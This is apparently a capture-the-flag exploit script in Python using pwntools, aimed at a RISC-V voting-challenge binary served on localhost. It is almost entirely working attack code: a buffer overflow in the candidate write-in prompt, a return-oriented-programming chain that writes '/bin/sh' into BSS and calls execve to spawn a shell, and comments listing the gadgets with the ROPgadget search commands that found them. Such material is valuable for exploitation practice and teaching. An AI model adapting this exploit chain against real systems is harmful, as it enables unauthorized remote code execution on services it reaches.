from pwn import *
from time import sleep

local=False
debug=False

context.binary=elfexe=ELF('../riscy_voting')
print(context)

PUTS_ADDR = 0x105de
BSS_ADDR = 0x7c000

WRITE_WHAT_WHERE_GADGET_ADDR_1 = 0x37f0c
WRITE_WHAT_WHERE_GADGET_ADDR_2 = 0x23408
WRITE_WHAT_WHERE_GADGET_ADDR_3 = 0x41c4c
WRITE_WHAT_WHERE_GADGET_ADDR_4 = 0x16d24
WRITE_WHAT_WHERE_GADGET_ADDR_5 = 0x3d19c 

WRITE_WHAT_WHERE_RET_ADDR = GET_SHELL_GADGET_ADDR_1 = WRITE_WHAT_WHERE_GADGET_ADDR_1
GET_SHELL_GADGET_ADDR_2 = WRITE_WHAT_WHERE_GADGET_ADDR_2
GET_SHELL_GADGET_ADDR_3 = WRITE_WHAT_WHERE_GADGET_ADDR_3
GET_SHELL_GADGET_ADDR_4 = WRITE_WHAT_WHERE_GADGET_ADDR_4
GET_SHELL_GADGET_ADDR_5 = 0x187dc # ecall

GET_SHELL_RET_ADDR = RUN_CHALLENGE_ADDR = 0x10566

# 0x10542: call to read in write-in candidate
if local:
    if debug:
        p = gdb.debug([elfexe.path],'''
                      break *0x37f0c
                      break *0x23408
                      break *0x41c4c
                      break *0x16d24
                      break *0x3d19c
                      break *0x105de
                      break *0x105e2
                      ''',
                      elfexe.path)
    else:
        p = process('qemu-riscv64-static ../riscy_voting', shell=True)
else:
    p = remote('127.0.0.1', 7702)

#sleep(20)
p.recvuntil(b'* * *\n')
p.send(b'\n')
p.recvuntil(b'> ')
p.send(b'5\n')
p.recvuntil(b'candidate: \n')

# Start with write_what_where. Write '/bin/sh' to the BSS section. 
# No need to null-terminate the string since all the addresses up there are zeroes.
# This payload is not optimized for space.
payload = b'A'*104+b'B'*8
payload += b'C'*8 # overwrite s0 (frame pointer) # Originally 0x2aaaab2aaae0 after the puts I return to
payload += p64(WRITE_WHAT_WHERE_GADGET_ADDR_1)
payload += p64(WRITE_WHAT_WHERE_GADGET_ADDR_5) # set s10
payload += b'E'*8 # set s9
payload += p64(0x0068732f6e69622f) # set s8 = '/bin/sh\x00'
payload += b'G'*8 # set s7
payload += b'H'*8 # set s6
payload += b'I'*8 # set s5
payload += b'J'*8 # set s4
payload += b'K'*8 # set s3
payload += b'L'*8 # set s2
payload += b'M'*8 # set s1
payload += b'N'*8 # set s0
payload += p64(WRITE_WHAT_WHERE_GADGET_ADDR_2) # ra
payload += b'a'*8
payload += b'b'*8
payload += b'c'*8
payload += b'd'*8
payload += b'e'*8 # a7
payload += b'f'*8 # a2
payload += b'g'*8 # a1
payload += p64(WRITE_WHAT_WHERE_GADGET_ADDR_3) # s0: jump here
payload += p64(BSS_ADDR - 0x328) # a0
payload += b'j'*8 
payload += b'k'*8
payload += b'l'*8 # a4
payload += b'm'*8
payload += p64(WRITE_WHAT_WHERE_GADGET_ADDR_4)
payload += b'O'*8
payload += b'P'*8
payload += b'Q'*8
payload += p64(WRITE_WHAT_WHERE_RET_ADDR) # GET_SHELL_GADGET_ADDR_1

# Start payload for getting the shell.
#    __asm("li a0,0x0068732f6e69622f\n\t"
#          "sd a0, 0(sp)\n\t"
#          "addi a0,sp,0\n\t"
#          "li a2,0x0\n\t"
#          "li a1,0x0\n\t"
#          "li a7,221\n\t"
#          "ecall\n\t"
payload += b'D'*8 # p64(GET_SHELL_GADGET_ADDR_5) # set s10 # will be a5
payload += b'E'*8 # set s9
payload += b'F'*8 # set s8
payload += b'G'*8 # set s7
payload += b'H'*8 # set s6
payload += b'I'*8 # set s5
payload += b'J'*8 # set s4
payload += b'K'*8 # set s3
payload += b'L'*8 # set s2
payload += b'M'*8 # set s1
payload += b'N'*8 # set s0
payload += p64(GET_SHELL_GADGET_ADDR_2)
payload += b'a'*8
payload += b'b'*8
payload += b'c'*8
payload += b'd'*8
payload += p64(221) # a7
payload += p64(0) # a2
payload += p64(0) # a1
payload += p64(GET_SHELL_GADGET_ADDR_3) # s0: jump here
payload += p64(BSS_ADDR) # a0
# Now a3=s8
# Now a6=0
# Now a4=0
# Now a5=s10
payload += b'j'*8 
payload += b'k'*8
payload += b'l'*8 # a4
payload += b'm'*8
payload += p64(GET_SHELL_GADGET_ADDR_5) # jump back to run_challenge after we return from the shell because why not also cast a ballot
#payload += b'O'*8 
#payload += b'P'*8
#payload += b'Q'*8
#payload += p64(GET_SHELL_RET_ADDR) # Fun little thing to add if the buffer were eight bytes longer


#GADGET 4: 0x0000000000016d24 : c.ldsp ra, 0x18(sp) ; c.addi16sp sp, 0x20 ; c.jr a5
#set ra
#increment sp
#jump to a5

p.send(payload)
p.interactive()
#p.close()as d

'''
So, here's my new plan.
GADGET 1 (charge s registers): 0x0000000000037f0c : c.ldsp ra, 0x58(sp) ; c.mv a0, s3 ; c.ldsp s0, 0x50(sp) ; c.ldsp s1, 0x48(sp) ; c.ldsp s2, 0x40(sp) ; c.ldsp s3, 0x38(sp) ; c.ldsp s4, 0x30(sp) ; c.ldsp s5, 0x28(sp) ; c.ldsp s6, 0x20(sp) ; c.ldsp s7, 0x18(sp) ; c.ldsp s8, 0x10(sp) ; c.ldsp s9, 8(sp) ; c.ldsp s10, 0(sp) ; c.addi16sp sp, 0x60 ; c.jr ra

set ra
a0=s3
set s0,s1,s2,s3,s4,s5,s6,s7,s8,s9,s10
add 0x60 to sd
return to ra
ROPgadget --binary riscy_voting --align 4 | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' | grep 'ldsp ra' | grep 'ldsp s1' | grep 'ldsp s0' | grep 'ldsp s2' | grep 'ldsp s3' | grep 'ldsp s4, 0x30(sp)' | grep 'ldsp s10' | grep 'addi16sp' | grep ': c.ldsp ra, 0x58(sp)'

GADGET 2 (charge a registers): 0x0000000000023408 : c.ldsp a7, 0x20(sp) ; c.ldsp a2, 0x28(sp) ; c.ldsp a1, 0x30(sp) ; c.ldsp a0, 0x40(sp) ; c.ldsp s0, 0x38(sp) ; c.sdsp a4, 0x58(sp) ; c.mv a5, s10 ; c.li a4, 0 ; c.li a6, 0 ; c.mv a3, s8 ; c.jalr s0
set a7
set a2
set a1
set a0
set s0
set a4
a5=s10
a4=0
a6=0
a3=s8
jump to s0
ROPgadget --binary riscy_voting --align 4 | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' | grep 'c.ldsp a0' | grep 'c.ldsp a1' | grep 'c.ldsp a7' | grep ': c.ldsp a7' | grep 'c.jalr s0'

GADGET 3 (restore stack pointer): 0x0000000000041c4c : c.ldsp ra, 0x68(sp) ; c.addi16sp sp, 0x70 ; c.jr ra
set ra
increment sp
jump to ra
ROPgadget --binary riscy_voting --align 4 | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' | grep 'c.addi16sp sp, 0x70' | grep ': c.ldsp ra'

# Next I need something to set ra and jump to an a register
GADGET 4: 0x0000000000016d24 : c.ldsp ra, 0x18(sp) ; c.addi16sp sp, 0x20 ; c.jr a5
set ra
increment sp
jump to a5
ROPgadget --binary riscy_voting --align 4 --depth 4 | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' | grep 'c.ldsp ra, 0x18(sp)' | grep 'c.jr a5'

GADGET 5 (ecall): 0x00000000000187dc : ecall ; c.jr ra
ROPgadget --binary riscy_voting --align 4 --depth 3 | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' | grep ': ecall'

GADGET 6 (write the a3 register to desired location): 0x000000000003d19c : sd a3, 0x328(a0) ; c.jr ra
[a0+0x328]=s3
ROPgadget --binary riscy_voting --align 4 | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' | grep -E 'sd\sa3,\s[0-9]x[0-9]+\(a0\)' | grep 'c.jr ra'

We can package these Gadgets 1-4 and 6 into one write-what-anywhere function. Then 1-4 and 5 give us a call to `execve('/bin/sh',NULL,NULL)`.

For the record, gadgets to help engineer a stack pivot (not used, but some teams may try this):
0x000000000006b98c : c.mv s2, s3 ; c.mv sp, ra ; c.jr a6
0x000000000006b98e : c.mv sp, ra ; c.jr a6
'''
'''
As a test I leaked that /bin/sh string by juping to PUTS. See exploit-riscy-voting-write-to-bss.py.
For that I used gadgets 1-4, and then had the call to PUTS be the contents of a5 that I jump to after Gadget 4.
'''


